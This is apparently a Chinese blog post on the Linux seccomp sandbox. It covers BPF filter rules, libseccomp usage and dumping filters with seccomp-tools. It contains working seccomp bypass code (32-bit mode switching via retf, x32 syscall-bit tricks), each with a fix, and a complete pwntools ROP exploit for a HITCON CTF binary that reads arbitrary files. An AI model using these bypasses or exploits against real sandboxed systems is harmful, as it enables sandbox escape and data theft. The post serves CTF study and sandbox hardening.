---
title: Linux Sandbox - Seccomp
date: 2020-04-17 10:21:52
tags: [linux, ctf]
---

Seccomp 可以为“不可信的纯计算型代码”提供一个“安全（SAFE, not SECURE）”的运行环境，以保护你的系统和应用程序的正常运行不受不可信代码的干扰。

<!-- more -->

# Seccomp Sandbox

Seccomp（Secure Computing mode）是 Linux 提供的一种沙箱机制，可以用来限制程序可以使用和不可使用的系统调用。简洁、优美是 Seccomp 的优点，但只能支持“纯计算型”代码却使得其应用受到很大限制。比如，Seccomp 模式的进程不能动态分配内存、不能与其它进程使用共享内存、不能使用新的文件描述符、等等。如果要支持具有丰富功能的应用程序，则需要另外的方法来截获并处理其它系统调用。Seccomp 沙箱主要有两种模式，`SECCOMP_SET_MODE_STRICT` 只运行调用 4 个系统调用 `read()`、`write()`、`exit()`、`sigreturn()` 四个系统调用，而 `SECCOMP_SET_MODE_FILTER` 则允许通过 BPF 指定系统调用的黑名单或者白名单。

Seccomp 本身是一种很安全的技术，但是在 `SECCOMP_SET_MODE_FILTER` 环境下通常会因为 BPF 使用不正确导致沙箱存在被绕过的可能。

- 限制一个程序能够使用的系统调用，可以是黑名单或白名单；
- 根据 Filter 的内容决定遇到系统调用时采取的行为，包括 kill、allow、trap 等等；
- Filter 可以做简单的计算、条件判断。

> 早期直接使用 `prctl` 来开启 Seccomp。现在已经有 libseccomp 库，可以直接使用 `seccomp_init`、`seccomp_rule_add`、`seccomp_load` 来设定规则。

## Seccomp using `prctl`

Seccomp 采用 Berkeley Packet Filter（BPF）格式，原本在防火墙（iptables）中用来过滤封包。使用 Seccomp 需要有 `CAP_SYS_ADMIN` Capability（相当于 root 的权限），非 root 用户则通过设置 PR_SET_NO_NEW_PRIVS 位来获取 `CAP_SYS_ADMIN` Capability。这样能保证 Seccomp 对所有用户都能起作用，并且会使子进程即 execve 后的进程依然受控。获取 `CAP_SYS_ADMIN` Capability 后，就可以开启相应的自定义规则。具体的规则定义在参数 `prog` 中：

```cpp
prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0); // 获取 CAP_SYS_ADMIN 权限
prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog); // 开启自定义的过滤规则
```

接下来看看 `prog` 对应的结构体 `sock_fprog` 以及用于过滤系统调用的结构体 `sock_filter`，主要定义在 [include/uapi/linux/filter.h](https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/filter.h)（`/usr/include/linux/filter.h`）中。其中 `sock_fprog` 第一个成员 `len` 记录过滤规则的个数；第二个成员 `filter` 是一个 `sock_filter` 数组，用于记录相应的过滤规则：

```cpp
/*
 *	Try and keep these values and structures similar to BSD, especially
 *	the BPF code definitions which need to match so you can share filters
 */

struct sock_filter {	/* Filter block */
	__u16	code;   /* Actual filter code */
	__u8	jt;	/* Jump true */
	__u8	jf;	/* Jump false */
	__u32	k;      /* Generic multiuse field */
};

struct sock_fprog {	/* Required for SO_ATTACH_FILTER. */
	unsigned short		len;	/* Number of filter blocks */
	struct sock_filter __user *filter;
};
```

为了方便操作 `sock_filter`，还定义了一组宏：

```cpp
/*
 * Macros for filter block array initializers.
 */
#ifndef BPF_STMT
#define BPF_STMT(code, k) { (unsigned short)(code), 0, 0, k }
#endif
#ifndef BPF_JUMP
#define BPF_JUMP(code, k, jt, jf) { (unsigned short)(code), jt, jf, k }
#endif
```

其中在 [include/uapi/linux/bpf_common.h](https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/bpf_common.h)（`/usr/include/linux/bpf_common.h`）对 code 进行了一系列的定义，包括一些数据操作指令、跳转指令、算术运算指令等等（Winesap 提到程序可以全部用 BPF 的算术运算单元来实现，运行的时间是算在内核里，据说居然可以在 OJ 里绕过时间限制）：

```cpp
/* Instruction classes */
#define BPF_CLASS(code) ((code) & 0x07)
#define		BPF_LD		0x00
#define		BPF_LDX		0x01
#define		BPF_ST		0x02
#define		BPF_STX		0x03
#define		BPF_ALU		0x04
#define		BPF_JMP		0x05
#define		BPF_RET		0x06
#define		BPF_MISC        0x07

/* ld/ldx fields */
#define BPF_SIZE(code)  ((code) & 0x18)
#define		BPF_W		0x00
#define		BPF_H		0x08
#define		BPF_B		0x10
#define BPF_MODE(code)  ((code) & 0xe0)
#define		BPF_IMM		0x00
#define		BPF_ABS		0x20
#define		BPF_IND		0x40
#define		BPF_MEM		0x60
#define		BPF_LEN		0x80
#define		BPF_MSH		0xa0

/* alu/jmp fields */
#define BPF_OP(code)    ((code) & 0xf0)
#define		BPF_ADD		0x00
#define		BPF_SUB		0x10
#define		BPF_MUL		0x20
#define		BPF_DIV		0x30
#define		BPF_OR		0x40
#define		BPF_AND		0x50
#define		BPF_LSH		0x60
#define		BPF_RSH		0x70
#define		BPF_NEG		0x80
#define		BPF_MOD		0x90
#define		BPF_XOR		0xa0

#define		BPF_JA		0x00
#define		BPF_JEQ		0x10
#define		BPF_JGT		0x20
#define		BPF_JGE		0x30
#define		BPF_JSET        0x40
#define BPF_SRC(code)   ((code) & 0x08)
#define		BPF_K		0x00
#define		BPF_X		0x08
```

从某个地址加载数据（数据的大小：`BPF_W`、`BPF_H`、`BPF_B`，地址的类型：`BPF_ABS`、`BPF_IMM`）：

```cpp
BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0)
```

然后 Seccomp 的返回值在 [include/uapi/linux/seccomp.h](https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/seccomp.h)（`/usr/include/linux/seccomp.h`）中有定义，意思也是比较直观的：

```cpp
/*
 * All BPF programs must return a 32-bit value.
 * The bottom 16-bits are for optional return data.
 * The upper 16-bits are ordered from least permissive values to most.
 *
 * The ordering ensures that a min_t() over composed return values always
 * selects the least permissive choice.
 */
#define SECCOMP_RET_KILL	0x00000000U /* kill the task immediately */
#define SECCOMP_RET_TRAP	0x00030000U /* disallow and force a SIGSYS */
#define SECCOMP_RET_ERRNO	0x00050000U /* returns an errno */
#define SECCOMP_RET_TRACE	0x7ff00000U /* pass to a tracer or disallow */
#define SECCOMP_RET_ALLOW	0x7fff0000U /* allow */
```

Seccomp 编写规则时会使用到一个 `seccomp_data` 结构体，定义在 [include/uapi/linux/seccomp.h](https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/seccomp.h)（`/usr/include/linux/seccomp.h`）中。各个成员如下：

- `nr`：系统调用号；
- `arch`：定义在 [include/uapi/linux/audit.h](https://elixir.bootlin.com/linux/v4.4.31/source/include/uapi/linux/audit.h)（`/usr/include/linux/audit.h`）中；
  - `i386`：0x40000003；
  - `amd64`：0xc000003e。
- `instruction_pointer`：系统调用号对应的 IP；
- `args`：系统调用号。
  - `i386`：ebx、ecx、edx、esi、edi；
  - `amd64`：rdi、rsi、rdx、r10、r8、r9。

```cpp
#define AUDIT_ARCH_I386		(EM_386|__AUDIT_ARCH_LE)
#define AUDIT_ARCH_IA64		(EM_IA_64|__AUDIT_ARCH_64BIT|__AUDIT_ARCH_LE)

/**
 * struct seccomp_data - the format the BPF program executes over.
 * @nr: the system call number
 * @arch: indicates system call convention as an AUDIT_ARCH_* value
 *        as defined in <linux/audit.h>.
 * @instruction_pointer: at the time of the system call.
 * @args: up to 6 system call arguments always stored as 64-bit values
 *        regardless of the architecture.
 */
struct seccomp_data {
	int nr;
	__u32 arch;
	__u64 instruction_pointer;
	__u64 args[6];
};
```

下面给一个例子测试，`SECCOMP_RET_ALLOW` 表示允许所有调用；`SECCOMP_RET_KILL` 表示禁止所有调用：

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>

int main() {
	struct sock_filter filter[] = {
//		BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
		BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
	};

	struct sock_fprog prog = {
		.len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
		.filter = filter,
	};

	prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
	prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);

	printf("###\n");
	system("ls");
}
```

`SECCOMP_RET_ALLOW` 会正常执行，而 `SECCOMP_RET_KILL` 会报“invalid system call”：

```bash
➜  seccomp ./sec
[1]    3372 invalid system call  ./sec
```

禁用 execve 系统调用的规则如下。首先取出 `seccomp_data` 中的 `nr`，然后和 59 比较。如果相等，则跳过一条规则，即被 kill；不相等的话，继续执行下一条规则，即 allow：

```cpp
struct sock_filter filter[] = {
	BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -> nr
	BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // compare nr with 59 (SYS_execve = 59)
	BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
	BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
};
```

Seccomp 的过滤规则可以通过 gdb 来 dump 出来，即第二次调用 prctl 时的第三个参数：

```
(gdb) p/x $rdx
$1 = 0x7fffffffe480
(gdb) x/2gx 0x7fffffffe480
0x7fffffffe480:	0x00007fffffff0004	0x00007fffffffe490
(gdb) x/4gx 0x00007fffffffe490
0x7fffffffe490:	0x0000000000000020	0x0000003b00010015
0x7fffffffe4a0:	0x7fff000000000006	0x0000000000000006
(gdb) dump memory dd 0x00007fffffffe490 0x00007fffffffe490+4*8
```

然后使用 libseccomp 中的 scmp_bpf_disasm 反编译获取大致的过滤规则，通常需要根据反编译出来的结果去查找对应函数的意义：

```bash
➜  seccomp scmp_bpf_disasm < dd
 line  OP   JT   JF   K
=================================
 0000: 0x20 0x00 0x00 0x00000004   ld  $data[4]
 0001: 0x15 0x00 0x03 0xc000003e   jeq 3221225534 true:0002 false:0005
 0002: 0x20 0x00 0x00 0x00000000   ld  $data[0]
 0003: 0x15 0x01 0x00 0x0000003b   jeq 59   true:0005 false:0004
 0004: 0x06 0x00 0x00 0x7fff0000   ret ALLOW
 0005: 0x06 0x00 0x00 0x00000000   ret KILL
```

使用 seccomp-tools 也可以进行解析。

## Seccomp using libseccomp

> 根据 veritas501 的博客做的一些记录。

这边需要先安装一些依赖才会有 `seccomp.h` 头文件：

```bash
sudo apt-get install libseccomp-dev libseccomp2 seccomp
```

具体在 `/usr/include/seccomp.h` 中，一些选项如下：

```cpp
/*
 * seccomp actions
 */

/**
 * Kill the process
 */
#define SCMP_ACT_KILL           0x00000000U
/**
 * Throw a SIGSYS signal
 */
#define SCMP_ACT_TRAP           0x00030000U
/**
 * Return the specified error code
 */
#define SCMP_ACT_ERRNO(x)       (0x00050000U | ((x) & 0x0000ffffU))
/**
 * Notify a tracing process with the specified value
 */
#define SCMP_ACT_TRACE(x)       (0x7ff00000U | ((x) & 0x0000ffffU))
/**
 * Allow the syscall to be executed
 */
#define SCMP_ACT_ALLOW          0x7fff0000U
```

`seccomp_init()` 用于初始化过滤状态：

```cpp
/**
 * Initialize the filter state
 * @param def_action the default filter action
 *
 * This function initializes the internal seccomp filter state and should
 * be called before any other functions in this library to ensure the filter
 * state is initialized.  Returns a filter context on success, NULL on failure.
 *
 */
scmp_filter_ctx seccomp_init(uint32_t def_action);
```

`seccomp_rule_add()` 用于添加新的规则。其中如果 `arg_cnt` 不为 0，那么 `arg_cnt` 表示后面限制的参数的个数，故只有参数满足要求时才会拦截：

```cpp
/**
 * Add a new rule to the filter
 * @param ctx the filter context
 * @param action the filter action
 * @param syscall the syscall number
 * @param arg_cnt the number of argument filters in the argument filter chain
 * @param ... scmp_arg_cmp structs (use of SCMP_ARG_CMP() recommended)
 *
 * This function adds a series of new argument/value checks to the seccomp
 * filter for the given syscall; multiple argument/value checks can be
 * specified and they will be chained together (AND'd together) in the filter.
 * If the specified rule needs to be adjusted due to architecture specifics it
 * will be adjusted without notification.  Returns zero on success, negative
 * values on failure.
 *
 */
int seccomp_rule_add(scmp_filter_ctx ctx,
                     uint32_t action, int syscall, unsigned int arg_cnt, ...);

**
 * Specify an argument comparison struct for use in declaring rules
 * @param arg the argument number, starting at 0
 * @param op the comparison operator, e.g. SCMP_CMP_*
 * @param datum_a dependent on comparison
 * @param datum_b dependent on comparison, optional
 */
#define SCMP_CMP(...)           ((struct scmp_arg_cmp){__VA_ARGS__})

/**
 * Specify an argument comparison struct for argument 0
 */
#define SCMP_A0(...)            SCMP_CMP(0, __VA_ARGS__)

/**
 * Specify an argument comparison struct for argument 1
 */
#define SCMP_A1(...)            SCMP_CMP(1, __VA_ARGS__)

/**
 * Specify an argument comparison struct for argument 2
 */
#define SCMP_A2(...)            SCMP_CMP(2, __VA_ARGS__)

/**
 * Specify an argument comparison struct for argument 3
 */
#define SCMP_A3(...)            SCMP_CMP(3, __VA_ARGS__)

/**
 * Specify an argument comparison struct for argument 4
 */
#define SCMP_A4(...)            SCMP_CMP(4, __VA_ARGS__)

/**
 * Specify an argument comparison struct for argument 5
 */
#define SCMP_A5(...)            SCMP_CMP(5, __VA_ARGS__)

/**
 * Comparison operators
 */
enum scmp_compare {
        _SCMP_CMP_MIN = 0,
        SCMP_CMP_NE = 1,                /**< not equal */
        SCMP_CMP_LT = 2,                /**< less than */
        SCMP_CMP_LE = 3,                /**< less than or equal */
        SCMP_CMP_EQ = 4,                /**< equal */
        SCMP_CMP_GE = 5,                /**< greater than or equal */
        SCMP_CMP_GT = 6,                /**< greater than */
        SCMP_CMP_MASKED_EQ = 7,         /**< masked equality */
        _SCMP_CMP_MAX,
};

/**
 * Argument datum
 */
typedef uint64_t scmp_datum_t;

/**
 * Argument / Value comparison definition
 */
struct scmp_arg_cmp {
        unsigned int arg;       /**< argument number, starting at 0 */
        enum scmp_compare op;   /**< the comparison op, e.g. SCMP_CMP_* */
        scmp_datum_t datum_a;
        scmp_datum_t datum_b;
};
```

`seccomp_load()` 用来应用规则：

```cpp
/**
 * Loads the filter into the kernel
 * @param ctx the filter context
 *
 * This function loads the given seccomp filter context into the kernel.  If
 * the filter was loaded correctly, the kernel will be enforcing the filter
 * when this function returns.  Returns zero on success, negative values on
 * error.
 *
 */
int seccomp_load(const scmp_filter_ctx ctx);
```

同样用最简单的例子测试一下：

```cpp
#include <stdio.h>
#include <unistd.h>
#include <seccomp.h>
#include <linux/seccomp.h>

char *args[] = {
	"/bin/ls",
	0,
};

int main() {
	scmp_filter_ctx ctx;
	ctx = seccomp_init(SCMP_ACT_ALLOW);
	seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(execve), 0);
	seccomp_load(ctx);

	printf("###\n");
	system("ls");
	execve(args[0], args, 0);
	return 0;
}
```

测试发现这里对 system 没有提示，直接过滤了，对 execve 会提示“invalid system call”。不过具体的功能是一样的：

```bash
➜  seccomp ./sec
###
[1]    5480 invalid system call  ./sec
```

# Bypass Seccomp

一般来说 64 位下的 Seccomp 会和前面的一样直接禁掉某个调用号。这种情况有一些方法可以对其绕过。

## 绕过没有检查架构（arch）

一般题目里至少有 `SYS_mmap` 或 `SYS_mprotect` 能用，所以通常有机会执行任意 shellcode。通过下面的函数可以在 x86 和 x86_64 之间切换。`retf` 相当于 `POP IP` 和 `POP CS` 两条指令，而 32 位下 CS 为 0x23；64 位下 CS 为 0x33：

```nasm
to32:
	mov DWORD [rsp + 4], 0x23
	retf

to64:
	mov DWORD [esp + 4], 0x33
	retf
```

假如程序的过滤规则和上面的一样，我们编写一个 `my_execve` 来调用：

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>

extern void my_execve(void *, void *, void *);

char *args[] = {
	"/bin/ls",
	0,
};

int main() {
	struct sock_filter filter[] = {
		BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -> nr
		BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // SYS_execve = 59
		BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
		BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
	};

	struct sock_fprog prog = {
		.len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
		.filter = filter,
	};

	prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
	prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);

	my_execve(args[0], args, 0);
}
```

`my_execve` 实现如下，因为 32 位下栈会少一半，所以为了防止程序 crash 需要搬一下栈：

```nasm
section .text
global my_execve

my_execve:
	lea rsp, [stack]
	call to32
	mov eax, 11
	mov ebx, edi
	mov ecx, esi
	int 0x80
	ret
to32:
	mov DWORD [rsp + 4], 0x23
	retf

section .bss
	resb 0x400
stack:
```

这样就可以成功执行 ls（如果开 sh 的话也没有办法执行命令的，因为 seccomp 的规则会在进程间继承）：

```bash
➜  seccomp ./sec
Makefile  dd  sec  sec.asm  sec.c  sec.o
```

限制办法就是添加对 arch 的检查：

```cpp
struct sock_filter filter[] = {
	BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 4), // ld arch
	BPF_JUMP(BPF_JMP + BPF_JEQ, 0xc000003e, 0, 3), // arch == x86_64
	BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -> nr
	BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // SYS_execve = 59
	BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
	BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
};
```

## 没有过滤 `__X32_SYSCALL_BIT`

- 在 x86_64 下的一种特殊模式，使用 64 位寄存器和 32 位地址。
- x32 中 `nr` 会加 `__X32_SYSCALL_BIT`（0x40000000），见 [include/uapi/asm/unistd.h](https://elixir.bootlin.com/linux/v4.4.31/source/arch/x86/include/uapi/asm/unistd.h)（`/usr/include/asm/unistd_x32.h`）
- 原本的系统调用号加上 0x40000000 是一样的效果

把 my_execve 修改如下：

```nasm
section .text
global my_execve

my_execve:
	mov rax, 59 + 0x40000000
	syscall
```

同样可以正常执行

```bash
➜  seccomp ./sec
Makefile  dd  sec  sec.asm  sec.c  sec.o
```

添加对系统调用号的检查来进行限制：

```cpp
struct sock_filter filter[] = {
	BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 4), // ld arch
	BPF_JUMP(BPF_JMP + BPF_JEQ, 0xc000003e, 0, 4), // arch == x86_64
	BPF_STMT(BPF_LD + BPF_W + BPF_ABS, 0), // offset = 0 -> nr
	BPF_JUMP(BPF_JMP + BPF_JSET, 0x40000000, 2, 0), // nr & 0x40000000
	BPF_JUMP(BPF_JMP + BPF_JEQ, 59, 1, 0), // SYS_execve = 59
	BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW),
	BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
};
```

## 没有道理的绕过方法

- 部分调用号是给 x32 用的，但在 x86_64 下一样能用
- 59、520、59+0x40000000、520+0x40000000 都是 execve
- 322、322+0x40000000、545、545+0x40000000（stub_execveat，和 execve 类似）也可以

# Binary Test

使用 seccomp-tools 对一些题目进行测试。

## pwnable.tw-orw

这道题当时是只能用 read、open、write 三个调用来读 flag。这里用 seccomp-tools 来查看一下是怎么实现的限制：

```bash
$ seccomp-tools dump ./orw
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011
 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011
 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011
 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011
 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011
 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011
 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011
 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

可以看到先是检查了 arch 必须是 32 位，然后系统调用只允许 rt_sigreturn、sigreturn、exit_group、exit、open、read、write。

## 0CTF-2018-mathgame

这道题也是限制了 arch 和一些调用：

```bash
$ seccomp-tools dump ./mathgame
Starting system, please wait...
System started!
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0x40000003  if (A == ARCH_I386) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x000000ad  if (A != rt_sigreturn) goto 0006
 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0006: 0x15 0x00 0x01 0x00000077  if (A != sigreturn) goto 0008
 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0008: 0x15 0x00 0x01 0x000000fc  if (A != exit_group) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x15 0x00 0x01 0x00000001  if (A != exit) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x15 0x00 0x01 0x00000005  if (A != open) goto 0014
 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0014: 0x15 0x00 0x01 0x00000003  if (A != read) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x15 0x00 0x01 0x00000004  if (A != write) goto 0018
 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0018: 0x15 0x00 0x01 0x000000c5  if (A != fstat64) goto 0020
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0020: 0x15 0x00 0x01 0x00000036  if (A != ioctl) goto 0022
 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0022: 0x15 0x00 0x01 0x0000008c  if (A != _llseek) goto 0024
 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0024: 0x15 0x00 0x01 0x000000c0  if (A != mmap2) goto 0026
 0025: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0026: 0x15 0x00 0x01 0x0000005b  if (A != munmap) goto 0028
 0027: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0028: 0x15 0x00 0x01 0x0000002d  if (A != brk) goto 0030
 0029: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0030: 0x06 0x00 0x00 0x00000000  return KILL
```

# Related CTF Challs

CTF 中涉及 Seccomp 的一些二进制题。记录一下用于在 IDA 中插入的 Seccomp 结构体：

```cpp
struct sock_filter {	/* Filter block */
	uint16_t	code;   /* Actual filter code */
	uint8_t	jt;	/* Jump true */
	uint8_t	jf;	/* Jump false */
	uint32_t	k;      /* Generic multiuse field */
};

struct sock_fprog {	/* Required for SO_ATTACH_FILTER. */
	unsigned short		len;	/* Number of filter blocks */
	struct sock_filter *filter;
};
```

## HITCON-2017-seccomp

先是一道逆向。程序不难，主要是逆 Seccomp 的部分来得出正确的 6 个参数。这里放一下[其他大佬的 Writeup](https://blukat29.github.io/2017/11/hitcon-quals-2017-seccomp/)：

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  signed int i; // [rsp+Ch] [rbp-54h]
  struct sock_fprog prog; // [rsp+10h] [rbp-50h]
  __int64 args[6]; // [rsp+20h] [rbp-40h]
  unsigned __int64 v7; // [rsp+58h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  prog.len = 4059;
  prog.filter = (struct sock_filter *)&s;
  memset(args, 0, sizeof(args));
  for ( i = 0; i <= 4; ++i )
    _isoc99_scanf("%llu", &args[i]);
  prctl(38, 1LL, 0LL, 0LL, 0LL);
  if ( prctl(22, 2LL, &prog) )
  {
    perror("prctl");
    exit(1);
  }
  syscall(4919LL, args[0], args[1], args[2], args[3], args[4], args[5]);
  printf("Excellent! flag: hitcon{%s}\n", args);
  return 0;
}
```

## HITCON-2017-Impeccable_Artifact

程序保护全开，且能对栈上的任意 8 个字节进行读写，同时没有对下标进行检查，所以能造成任意地址读写。然后一开始在 prepare 函数中对 syscall 进行了限制：

```cpp
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int c; // [rsp+8h] [rbp-658h]
  int idx; // [rsp+Ch] [rbp-654h]
  __int64 arr[201]; // [rsp+10h] [rbp-650h]
  unsigned __int64 v7; // [rsp+658h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  prepare();
  memset(arr, 0, 0x640uLL);
  while ( 1 )
  {
    menu();
    idx = 0;
    _isoc99_scanf("%d", &c);
    if ( c != 1 && c != 2 )
      break;
    puts("Idx?");
    _isoc99_scanf("%d", &idx);
    if ( c == 1 )
    {
      printf("Here it is: %lld\n", arr[idx]);
    }
    else
    {
      puts("Give me your number:");
      _isoc99_scanf("%lld", &arr[idx]);
    }
  }
  return 0LL;
}
```

用 seccomp-tools 中可以查看到程序判断了系统架构，然后将传入的第三个参数作为系统调用号（即 rdx 等于 rax），后面会判断 sys_number 和 rdx 是否相等，如果相等也能过 check，这个地方可以构造出一些本身被限制的函数。然后允许 read、write、fstat 等一些函数：

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x10 0xc000003e  if (A != ARCH_X86_64) goto 0018
 0002: 0x20 0x00 0x00 0x00000020  A = args[2]
 0003: 0x07 0x00 0x00 0x00000000  X = A
 0004: 0x20 0x00 0x00 0x00000000  A = sys_number
 0005: 0x15 0x0d 0x00 0x00000000  if (A == read) goto 0019
 0006: 0x15 0x0c 0x00 0x00000001  if (A == write) goto 0019
 0007: 0x15 0x0b 0x00 0x00000005  if (A == fstat) goto 0019
 0008: 0x15 0x0a 0x00 0x00000008  if (A == lseek) goto 0019
 0009: 0x15 0x01 0x00 0x00000009  if (A == mmap) goto 0011
 0010: 0x15 0x00 0x03 0x0000000a  if (A != mprotect) goto 0014
 0011: 0x87 0x00 0x00 0x00000000  A = X
 0012: 0x54 0x00 0x00 0x00000001  A &= 0x1
 0013: 0x15 0x04 0x05 0x00000001  if (A == 1) goto 0018 else goto 0019
 0014: 0x1d 0x04 0x00 0x0000000b  if (A == X) goto 0019
 0015: 0x15 0x03 0x00 0x0000000c  if (A == brk) goto 0019
 0016: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0019
 0017: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0019
 0018: 0x06 0x00 0x00 0x00000000  return KILL
 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW
```

经过调试可以找到某些地址泄漏 Binary 和 libc，然后改 ret 处的代码构造 ROP 就能任意文件读取：

```python
#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

p = process('./artifact')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def cmd(c):
    p.recvuntil('Choice?\n')
    p.sendline(str(c))

def show(idx):
    cmd(1)
    p.recvuntil('Idx?\n')
    p.sendline(str(idx))
    p.recvuntil('Here it is:')
    return int(p.recvuntil('\n', drop=True))

def memo(idx, num):
    cmd(2)
    p.recvuntil('Idx?\n')
    p.sendline(str(idx))
    p.recvuntil('Give me your number:\n')
    p.sendline(str(num))

def leave():
    cmd(3)

binary_base = show(202) - 0xbb0
bss_buf = binary_base + 0x202000
info('binary_base = ' + hex(binary_base))
offset = 0x00007ffff7a2d830 - 0x7ffff7a0d000
libc_base = show(203) - offset
info('libc_base = ' + hex(libc_base))
pop_rdi_ret = libc_base + next(libc.search(asm('pop rdi ; ret')))
pop_rsi_ret = libc_base + next(libc.search(asm('pop rsi ; ret')))
pop_rdx_ret = libc_base + next(libc.search(asm('pop rdx ; ret')))
read_addr = libc_base + libc.symbols['read']
write_addr = libc_base + libc.symbols['write']
open_addr = libc_base + libc.symbols['open']

def set_syscall(idx, syscall, rdi, rsi, rdx):
    memo(idx, pop_rdi_ret)
    memo(idx + 1, rdi)
    memo(idx + 2, pop_rsi_ret)
    memo(idx + 3, rsi)
    memo(idx + 4, pop_rdx_ret)
    memo(idx + 5, rdx)
    memo(idx + 6, syscall)

file_name_addr = bss_buf + 0x500
buf_addr = bss_buf + 0x600
set_syscall(203, read_addr, 0, file_name_addr, 0x20) # read file's name
set_syscall(210, open_addr, file_name_addr, 0, 2) # open's syscall number == 2
set_syscall(217, read_addr, 3, buf_addr, 0x1000) # read file's content
set_syscall(224, write_addr, 1, buf_addr, 0x1000) # write to stdout
leave()
p.sendline('exp.py\x00')
p.interactive()
```

## BSides-CTF-2015-Baby_Playpen_Fence

TODO

## BSides-CTF-2015-Big_Prison_Fence

TODO

# References

https://www.youtube.com/watch?v=gQXyZY7Ucjc
https://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/
https://www.linuxidc.com/Linux/2015-02/112913.htm
https://en.wikipedia.org/wiki/Seccomp
https://atum.li/2017/04/25/linuxsandbox/#seccomp
https://veritas501.space/2018/05/05/seccomp%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/
https://github.com/briansp8210/CTF-writeup/tree/master/HITCON-2017-qual/Impeccable-Artifact
https://blukat29.github.io/2017/11/hitcon-quals-2017-artifact/
